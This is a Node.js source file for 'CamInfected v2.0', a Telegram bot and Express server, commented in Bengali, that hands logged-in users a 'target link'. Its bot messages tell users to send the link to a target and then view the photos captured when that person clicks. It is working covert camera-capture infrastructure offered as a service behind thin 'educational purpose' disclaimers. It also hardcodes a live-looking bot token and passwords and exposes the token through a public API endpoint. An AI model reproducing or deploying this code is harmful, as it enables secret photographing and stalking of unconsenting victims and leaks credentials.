require('dotenv').config();
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');

// ============== কনফিগারেশন ==============
const BOT_TOKEN = '8879628119:AAEhUJ5PJ4zH4jZqG-M229pU_MsZLXrybKo';
const OWNER_CHAT_ID = '8678824835';
const ADMIN_PASSWORD = 'admin@alamin#4045034';  // আপডেটেড অ্যাডমিন পাসওয়ার্ড
const USER_PASSWORD = 'owner@mrvirus460#alamin';  // ইউজার পাসওয়ার্ড
const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://project-production-8b84.up.railway.app';

// ============== এক্সপ্রেস অ্যাপ ==============
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============== SQLite ডাটাবেজ ==============
let db;

async function initDatabase() {
  db = await open({
    filename: './caminfected.db',
    driver: sqlite3.Database
  });
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      chatId TEXT PRIMARY KEY,
      username TEXT,
      firstName TEXT,
      lastName TEXT,
      isApproved INTEGER DEFAULT 0,
      isBlocked INTEGER DEFAULT 0,
      isAdmin INTEGER DEFAULT 0,
      referralCode TEXT UNIQUE,
      createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
      lastActive DATETIME DEFAULT CURRENT_TIMESTAMP,
      totalLinks INTEGER DEFAULT 0,
      totalPhotos INTEGER DEFAULT 0
    )
  `);
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS photos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      userChatId TEXT,
      photoId TEXT,
      fileId TEXT,
      caption TEXT,
      deviceInfo TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      action TEXT,
      details TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  
  // ওনারকে অ্যাডমিন হিসেবে সেট করা
  await db.run(`
    INSERT OR REPLACE INTO users (chatId, username, firstName, isApproved, isAdmin, referralCode) 
    VALUES (?, 'owner', 'Owner', 1, 1, ?)
  `, [OWNER_CHAT_ID, generateReferralCode(OWNER_CHAT_ID)]);
  
  console.log('✅ Database ready');
}

function generateReferralCode(chatId) {
  const crypto = require('crypto');
  return crypto.createHash('md5').update(chatId + Date.now()).digest('hex').substring(0, 10);
}

async function logActivity(chatId, action, details = {}) {
  await db.run('INSERT INTO logs (chatId, action, details) VALUES (?, ?, ?)', 
    [chatId, action, JSON.stringify(details)]);
}

async function getUserStats(chatId) {
  const photos = await db.get('SELECT COUNT(*) as count FROM photos WHERE userChatId = ?', [chatId]);
  const user = await db.get('SELECT totalLinks, lastActive FROM users WHERE chatId = ?', [chatId]);
  return {
    totalPhotos: photos?.count || 0,
    totalLinks: user?.totalLinks || 0,
    lastActive: user?.lastActive || new Date()
  };
}

async function isAdmin(chatId) {
  const user = await db.get('SELECT isAdmin FROM users WHERE chatId = ?', [chatId]);
  return user?.isAdmin === 1;
}

// ============== টেলিগ্রাম বট ==============
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ============== স্টার্ট কমান্ড ==============
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const username = msg.from?.first_name || '';
  const referralCode = match[1];
  
  let user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (!user) {
    const newReferralCode = generateReferralCode(chatId);
    await db.run(
      'INSERT INTO users (chatId, username, firstName, lastName, referralCode) VALUES (?, ?, ?, ?, ?)',
      [chatId, msg.from?.username || '', msg.from?.first_name || '', msg.from?.last_name || '', newReferralCode]
    );
    
    if (referralCode) {
      const referrer = await db.get('SELECT * FROM users WHERE referralCode = ?', [referralCode]);
      if (referrer) {
        await logActivity(referrer.chatId, 'referral_used', { referredUser: chatId });
        await bot.sendMessage(referrer.chatId, `🎉 নতুন ইউজার আপনার রেফারেল লিংক ব্যবহার করেছে!`);
      }
    }
  }
  
  await bot.sendMessage(chatId, `🎉 *ক্যামইনফেক্টেড বটে স্বাগতম!* 🎉

━━━━━━━━━━━━━━━━━━━━
📸 *CamInfected v2.0*
━━━━━━━━━━━━━━━━━━━━

⚠️ *সতর্কতা / সাবধানবাণী:* ⚠️

এই সিস্টেমটি শুধুমাত্র *শিক্ষামূলক উদ্দেশ্যে* তৈরি করা হয়েছে!

▫️ এই টুল ব্যবহার করে কোনো অবৈধ কাজ করলে তার সম্পূর্ণ দায়ভার ব্যবহারকারীর নিজের।
▫️ ডেভেলপার কোনো ধরনের ক্ষতির জন্য দায়ী নয়।
▫️ অন্যের অনুমতি ছাড়া ক্যামেরা অ্যাক্সেস করা আইনত দণ্ডনীয় অপরাধ।
▫️ শুধুমাত্র নিজের ডিভাইসে টেস্টিং এর জন্য ব্যবহার করুন।

━━━━━━━━━━━━━━━━━━━━
🔐 *সিস্টেম অ্যাক্সেস পেতে* পাসওয়ার্ড প্রয়োজন!

⚠️ পাসওয়ার্ড জানা না থাকলে ডেভেলপারের সাথে যোগাযোগ করুন।

📌 *লগইন করার পর যা পাবেন:*
├─ 🔗 টার্গেট লিংক তৈরি
├─ 📸 ছবি সংগ্রহ
└─ 📊 স্ট্যাটাস দেখা

━━━━━━━━━━━━━━━━━━━━
👨‍💻 *ডেভেলপার: Mohammad Alamin*
📱 TikTok: @mr_virus_apk
📘 Facebook: Mohammad Alamin
📨 Telegram: @mrvirus460
━━━━━━━━━━━━━━━━━━━━

🔑 *লগইন করতে:* /login আপনার_পাসওয়ার্ড
❓ *সাহায্য:* /help

📜 *এই টুল ব্যবহার করে আপনি উপরের শর্তাবলীতে সম্মত হচ্ছেন।*`, { parse_mode: 'Markdown' });
});

// ============== লগইন কমান্ড ==============
bot.onText(/\/login (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const password = match[1];
  
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (user && user.isBlocked === 1) {
    await bot.sendMessage(chatId, `❌ *আপনাকে ব্লক করা হয়েছে!* যোগাযোগ করুন: @mrvirus460`, { parse_mode: 'Markdown' });
    return;
  }
  
  // অ্যাডমিন পাসওয়ার্ড চেক
  if (password === ADMIN_PASSWORD) {
    await db.run('UPDATE users SET isApproved = 1, isAdmin = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
    await logActivity(chatId, 'admin_login_success');
    
    await bot.sendMessage(chatId, `✅ *অ্যাডমিন লগইন সফল!*

━━━━━━━━━━━━━━━━━━━━
👑 *আপনি অ্যাডমিন হিসেবে লগইন করেছেন!*
━━━━━━━━━━━━━━━━━━━━

📌 *অ্যাডমিন কমান্ড সমূহ:*
├─ /admin - অ্যাডমিন প্যানেল
├─ /users - সকল ইউজার দেখুন
├─ /block [chatId] - ইউজার ব্লক
├─ /unblock [chatId] - ইউজার আনব্লক
├─ /stats - বিস্তারিত পরিসংখ্যান
└─ /logs - লাস্ট ২০ লগ দেখুন

━━━━━━━━━━━━━━━━━━━━
🔗 *আপনার টার্গেট লিংক:*
\`${BASE_URL}/?chat_id=${chatId}\`

📸 *ছবি দেখতে:* /myphotos`, { parse_mode: 'Markdown' });
  }
  // ইউজার পাসওয়ার্ড চেক
  else if (password === USER_PASSWORD) {
    await db.run('UPDATE users SET isApproved = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
    await logActivity(chatId, 'login_success');
    
    const link = `${BASE_URL}/?chat_id=${chatId}`;
    
    await bot.sendMessage(chatId, `✅ *লগইন সফল!*

━━━━━━━━━━━━━━━━━━━━
🔗 *আপনার টার্গেট লিংক:*
\`${link}\`

📌 *কমান্ড গুলো:*
├─ /getlink - নতুন লিংক তৈরি
├─ /myphotos - ছবি দেখা
└─ /mystatus - স্ট্যাটাস দেখা

⚠️ *সতর্কতা:* এই লিংক শুধু আপনার জন্য

━━━━━━━━━━━━━━━━━━━━
📜 *মনে রাখবেন:* এই টুল শুধু শিক্ষামূলক উদ্দেশ্যে`, { parse_mode: 'Markdown' });
  } else {
    await logActivity(chatId, 'login_failed', { password: password });
    await bot.sendMessage(chatId, `❌ *ভুল পাসওয়ার্ড!*

পাসওয়ার্ড জানা না থাকলে ডেভেলপারের সাথে যোগাযোগ করুন।

👨‍💻 যোগাযোগ: @mrvirus460`, { parse_mode: 'Markdown' });
  }
});

// ============== গেট লিংক কমান্ড ==============
bot.onText(/\/getlink/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (!user || user.isApproved !== 1) {
    await bot.sendMessage(chatId, `❌ আপনি প্রথমে লগইন করুন! /login`);
    return;
  }
  
  if (user.isBlocked === 1) {
    await bot.sendMessage(chatId, `❌ আপনি ব্লক করা হয়েছেন! যোগাযোগ করুন: @mrvirus460`);
    return;
  }
  
  const link = `${BASE_URL}/?chat_id=${chatId}`;
  
  await db.run('UPDATE users SET totalLinks = totalLinks + 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
  await logActivity(chatId, 'link_generated');
  
  await bot.sendMessage(chatId, `🔗 *আপনার টার্গেট লিংক:*

\`${link}\`

━━━━━━━━━━━━━━━━━━━━
📌 *কিভাবে ব্যবহার করবেন:*
1. এই লিংক কপি করুন
2. আপনার টার্গেটকে পাঠান
3. টার্গেট লিংকে ক্লিক করলে ছবি আসবে
4. /myphotos দিয়ে ছবি দেখুন

⚠️ *শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন*`, { parse_mode: 'Markdown' });
});

// ============== মাই ফটোস কমান্ড ==============
bot.onText(/\/myphotos/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (!user || user.isApproved !== 1) {
    await bot.sendMessage(chatId, `❌ প্রথমে লগইন করুন! /login`);
    return;
  }
  
  if (user.isBlocked === 1) {
    await bot.sendMessage(chatId, `❌ আপনি ব্লক করা হয়েছেন!`);
    return;
  }
  
  const photos = await db.all('SELECT * FROM photos WHERE userChatId = ? ORDER BY timestamp DESC LIMIT 20', [chatId]);
  
  if (photos.length === 0) {
    await bot.sendMessage(chatId, `📸 এখনো কোনো ছবি নেই।

আপনার টার্গেট লিংক ব্যবহার করে ছবি পাঠানোর জন্য অপেক্ষা করুন।`);
    return;
  }
  
  await bot.sendMessage(chatId, `📸 *আপনার সর্বশেষ ${photos.length}টি ছবি:*`, { parse_mode: 'Markdown' });
  
  for (const photo of photos) {
    try {
      let deviceInfo = {};
      try { deviceInfo = JSON.parse(photo.deviceInfo || '{}'); } catch(e) {}
      
      await bot.sendPhoto(chatId, photo.fileId, {
        caption: `📸 *ছবি আইডি:* ${photo.photoId}
⏰ *সময়:* ${new Date(photo.timestamp).toLocaleString('bn-BD')}
📱 *ডিভাইস:* ${deviceInfo?.browser || 'N/A'} on ${deviceInfo?.os || 'N/A'}

━━━━━━━━━━━━━━━━━━━━
📸 CamInfected 🤖
👨‍💻 Developed by Mohammad Alamin
⚠️ For Educational Purpose Only`
      });
    } catch(e) {
      console.error('Error:', e);
    }
  }
});

// ============== মাই স্ট্যাটাস কমান্ড ==============
bot.onText(/\/mystatus/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  const stats = await getUserStats(chatId);
  
  const statusMsg = `
📊 *আপনার অ্যাকাউন্ট স্ট্যাটাস*

━━━━━━━━━━━━━━━━━━━━
👤 *ইউজার ইনফো*
━━━━━━━━━━━━━━━━━━━━
🆔 চ্যাট আইডি: \`${chatId}\`
👤 নাম: ${user?.firstName || 'N/A'}
👑 অ্যাডমিন: ${user?.isAdmin === 1 ? '✅ হ্যাঁ' : '❌ না'}
✅ স্ট্যাটাস: ${user?.isApproved === 1 ? '✅ অ্যাক্টিভ' : '❌ ইনঅ্যাক্টিভ'}
🔒 ব্লক: ${user?.isBlocked === 1 ? '🔴 হ্যাঁ' : '⚪ না'}

━━━━━━━━━━━━━━━━━━━━
📸 *পরিসংখ্যান*
━━━━━━━━━━━━━━━━━━━━
📸 মোট ছবি: ${stats.totalPhotos}
🔗 মোট লিংক: ${stats.totalLinks}
🕐 শেষ অ্যাক্টিভ: ${new Date(stats.lastActive).toLocaleString('bn-BD')}

━━━━━━━━━━━━━━━━━━━━
🔗 *নতুন লিংক:* /getlink
  `;
  
  await bot.sendMessage(chatId, statusMsg, { parse_mode: 'Markdown' });
});

// ============== হেল্প কমান্ড ==============
bot.onText(/\/help/, async (msg) => {
  const isAdminUser = await isAdmin(msg.chat.id.toString());
  
  let helpMsg = `
❓ *ক্যামইনফেক্টেড হেল্প সেন্টার*

━━━━━━━━━━━━━━━━━━━━
📌 *কমান্ড লিস্ট*
━━━━━━━━━━━━━━━━━━━━

🔐 \`/login পাসওয়ার্ড\` - সিস্টেম লগইন
🔗 \`/getlink\` - টার্গেট লিংক তৈরি
📸 \`/myphotos\` - ছবি গ্যালারি দেখুন
📊 \`/mystatus\` - অ্যাকাউন্ট স্ট্যাটাস
❓ \`/help\` - এই হেল্প মেসেজ
`;

  if (isAdminUser) {
    helpMsg += `
━━━━━━━━━━━━━━━━━━━━
👑 *অ্যাডমিন কমান্ড*
━━━━━━━━━━━━━━━━━━━━

\`/admin\` - অ্যাডমিন প্যানেল
\`/users\` - সকল ইউজার দেখুন
\`/block [chatId]\` - ইউজার ব্লক
\`/unblock [chatId]\` - ইউজার আনব্লক
\`/stats\` - বিস্তারিত পরিসংখ্যান
\`/logs\` - লগ দেখুন
`;
  }

  helpMsg += `
━━━━━━━━━━━━━━━━━━━━
💡 *টিপস*
━━━━━━━━━━━━━━━━━━━━

1. প্রথমে /login দিয়ে লগইন করুন
2. /getlink দিয়ে লিংক তৈরি করুন
3. লিংক টার্গেটকে পাঠান
4. /myphotos দিয়ে ছবি দেখুন

━━━━━━━━━━━━━━━━━━━━
⚠️ *সতর্কতা*
━━━━━━━━━━━━━━━━━━━━

এই টুল শুধুমাত্র *শিক্ষামূলক উদ্দেশ্যে* ব্যবহার করুন।
অন্যের অনুমতি ছাড়া ব্যবহার আইনত দণ্ডনীয় অপরাধ।

━━━━━━━━━━━━━━━━━━━━
👨‍💻 *সাপোর্ট*
━━━━━━━━━━━━━━━━━━━━

📨 Telegram: @mrvirus460
📘 Facebook: Mohammad Alamin
  `;
  
  await bot.sendMessage(msg.chat.id, helpMsg, { parse_mode: 'Markdown' });
});

// ============== অ্যাডমিন প্যানেল ==============
bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id.toString();
  
  if (!(await isAdmin(chatId))) {
    await bot.sendMessage(chatId, `❌ আপনি অ্যাডমিন নন!`);
    return;
  }
  
  const totalUsers = await db.get('SELECT COUNT(*) as count FROM users');
  const approvedUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isApproved = 1');
  const blockedUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isBlocked = 1');
  const totalPhotos = await db.get('SELECT COUNT(*) as count FROM photos');
  const todayPhotos = await db.get("SELECT COUNT(*) as count FROM photos WHERE date(timestamp) = date('now')");
  const adminUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isAdmin = 1');
  
  await bot.sendMessage(chatId, `👑 *অ্যাডমিন কন্ট্রোল প্যানেল*

━━━━━━━━━━━━━━━━━━━━
📊 *পরিসংখ্যান*
━━━━━━━━━━━━━━━━━━━━
👥 মোট ইউজার: ${totalUsers.count}
✅ অ্যাপ্রুভড: ${approvedUsers.count}
🔴 ব্লকড: ${blockedUsers.count}
👑 অ্যাডমিন: ${adminUsers.count}
📸 মোট ছবি: ${totalPhotos.count}
📸 আজকের ছবি: ${todayPhotos?.count || 0}

━━━━━━━━━━━━━━━━━━━━
🔧 *অ্যাডমিন কমান্ড*
━━━━━━━━━━━━━━━━━━━━

\`/users\` - সকল ইউজার দেখুন
\`/block [chatId]\` - ইউজার ব্লক করুন
\`/unblock [chatId]\` - ইউজার আনব্লক করুন
\`/stats\` - বিস্তারিত পরিসংখ্যান
\`/logs\` - লাস্ট ২০ লগ দেখুন
\`/makeadmin [chatId]\` - ইউজারকে অ্যাডমিন করুন

━━━━━━━━━━━━━━━━━━━━
🔄 *আপডেটেড:* ${new Date().toLocaleString('bn-BD')}`, { parse_mode: 'Markdown' });
});

// ইউজার লিস্ট
bot.onText(/\/users/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  
  const users = await db.all('SELECT * FROM users ORDER BY createdAt DESC LIMIT 20');
  let list = '👥 *সর্বশেষ ২০ জন ইউজার*\n━━━━━━━━━━━━━━━━━━━━\n';
  for (const u of users) {
    list += `\n🆔 \`${u.chatId}\`\n👤 ${u.firstName || 'N/A'} @${u.username || 'N/A'}\n✅ ${u.isApproved ? '✓' : '✗'} | 👑 ${u.isAdmin ? '✓' : '✗'} | 🔒 ${u.isBlocked ? '🔴' : '⚪'}\n📅 ${new Date(u.createdAt).toLocaleDateString()}\n━━━━━━━━━━━━━━━━━━━━\n`;
  }
  await bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
});

// ইউজার ব্লক
bot.onText(/\/block (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  
  const target = match[1];
  await db.run('UPDATE users SET isBlocked = 1 WHERE chatId = ?', [target]);
  await logActivity(chatId, 'user_blocked', { target: target });
  await bot.sendMessage(chatId, `✅ ব্লক করা হয়েছে: ${target}`);
  await bot.sendMessage(target, `❌ *আপনাকে ব্লক করা হয়েছে!*

আনব্লক করতে ডেভেলপারের সাথে যোগাযোগ করুন।

👨‍💻 যোগাযোগ: @mrvirus460

ধন্যবাদ।`, { parse_mode: 'Markdown' });
});

// ইউজার আনব্লক
bot.onText(/\/unblock (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  
  const target = match[1];
  await db.run('UPDATE users SET isBlocked = 0 WHERE chatId = ?', [target]);
  await logActivity(chatId, 'user_unblocked', { target: target });
  await bot.sendMessage(chatId, `✅ আনব্লক করা হয়েছে: ${target}`);
  await bot.sendMessage(target, `✅ *আপনি আনব্লক করা হয়েছে!*

আপনি এখন আবার CamInfected সিস্টেম ব্যবহার করতে পারবেন।

🔐 লগইন করতে: /login`, { parse_mode: 'Markdown' });
});

// ইউজারকে অ্যাডমিন বানান
bot.onText(/\/makeadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  
  const target = match[1];
  await db.run('UPDATE users SET isAdmin = 1 WHERE chatId = ?', [target]);
  await logActivity(chatId, 'user_made_admin', { target: target });
  await bot.sendMessage(chatId, `✅ ${target} কে অ্যাডমিন করা হয়েছে!`);
  await bot.sendMessage(target, `👑 *আপনাকে অ্যাডমিন করা হয়েছে!*

আপনি এখন অ্যাডমিন কমান্ড ব্যবহার করতে পারবেন।

/admin দেখুন।`, { parse_mode: 'Markdown' });
});

// স্ট্যাটাস কমান্ড
bot.onText(/\/stats/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  
  const totalUsers = await db.get('SELECT COUNT(*) as count FROM users');
  const approvedUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isApproved = 1');
  const blockedUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isBlocked = 1');
  const totalPhotos = await db.get('SELECT COUNT(*) as count FROM photos');
  const todayPhotos = await db.get("SELECT COUNT(*) as count FROM photos WHERE date(timestamp) = date('now')");
  const weekPhotos = await db.get("SELECT COUNT(*) as count FROM photos WHERE timestamp >= datetime('now', '-7 days')");
  const adminUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isAdmin = 1');
  
  const userWithMostPhotos = await db.get(`
    SELECT userChatId, COUNT(*) as count FROM photos 
    GROUP BY userChatId ORDER BY count DESC LIMIT 1
  `);
  
  await bot.sendMessage(chatId, `📊 *বিস্তারিত পরিসংখ্যান*

━━━━━━━━━━━━━━━━━━━━
👥 *ইউজার পরিসংখ্যান*
━━━━━━━━━━━━━━━━━━━━
📊 মোট ইউজার: ${totalUsers.count}
✅ অ্যাপ্রুভড: ${approvedUsers.count}
🔴 ব্লকড: ${blockedUsers.count}
👑 অ্যাডমিন: ${adminUsers.count}
📈 অ্যাপ্রুভাল রেট: ${((approvedUsers.count / totalUsers.count) * 100).toFixed(1)}%

━━━━━━━━━━━━━━━━━━━━
📸 *ছবি পরিসংখ্যান*
━━━━━━━━━━━━━━━━━━━━
📸 মোট ছবি: ${totalPhotos.count}
📸 আজকের ছবি: ${todayPhotos?.count || 0}
📆 সাপ্তাহিক ছবি: ${weekPhotos?.count || 0}
👑 টপ ইউজার: ${userWithMostPhotos?.userChatId || 'N/A'} (${userWithMostPhotos?.count || 0} ছবি)

━━━━━━━━━━━━━━━━━━━━
🔄 *লাস্ট আপডেট:* ${new Date().toLocaleString('bn-BD')}`, { parse_mode: 'Markdown' });
});

// লগ দেখুন
bot.onText(/\/logs/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  
  const logs = await db.all('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20');
  
  if (logs.length === 0) {
    await bot.sendMessage(chatId, `📋 কোনো লগ নেই।`);
    return;
  }
  
  let logMsg = `📋 *লাস্ট ২০ টি লগ*\n━━━━━━━━━━━━━━━━━━━━\n`;
  for (const log of logs) {
    logMsg += `\n🆔 ${log.chatId}\n📌 ${log.action}\n⏰ ${new Date(log.timestamp).toLocaleString('bn-BD')}\n━━━━━━━━━━━━━━━━━━━━\n`;
  }
  
  await bot.sendMessage(chatId, logMsg, { parse_mode: 'Markdown' });
});

// ============== API এন্ডপয়েন্ট ==============
app.get('/api/bot-info', (req, res) => {
  res.json({ botToken: BOT_TOKEN, ownerChatId: OWNER_CHAT_ID, baseUrl: BASE_URL });
});

app.post('/api/upload-photo', async (req, res) => {
  const { chatId, photoId, fileId, caption, deviceInfo } = req.body;
  
  if (!chatId || !photoId || !fileId) {
    return res.status(400).json({ error: 'Missing fields' });
  }
  
  try {
    await db.run(
      'INSERT INTO photos (chatId, userChatId, photoId, fileId, caption, deviceInfo) VALUES (?, ?, ?, ?, ?, ?)',
      [chatId, chatId, photoId, fileId, caption || '', JSON.stringify(deviceInfo || {})]
    );
    
    await db.run('UPDATE users SET totalPhotos = totalPhotos + 1 WHERE chatId = ?', [chatId]);
    
    await bot.sendMessage(OWNER_CHAT_ID, `📸 *নতুন ছবি!*
🆔 ${chatId}
📸 ${photoId}
⏰ ${new Date().toLocaleString('bn-BD')}`, { parse_mode: 'Markdown' });
    
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (user && user.isApproved === 1 && user.isBlocked !== 1) {
      await bot.sendMessage(chatId, `📸 *নতুন ছবি এসেছে!*

আপনার গ্যালারিতে নতুন ছবি যোগ করা হয়েছে।

/myphotos দেখতে পারেন।`, { parse_mode: 'Markdown' });
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Error' });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============== সার্ভার স্টার্ট ==============
async function startServer() {
  await initDatabase();
  app.listen(PORT, () => {
    console.log(`✅ Server: ${BASE_URL}`);
    console.log(`✅ Local: http://localhost:${PORT}`);
    console.log(`🤖 Bot is running`);
    console.log(`👑 Owner: ${OWNER_CHAT_ID}`);
  });
}

startServer();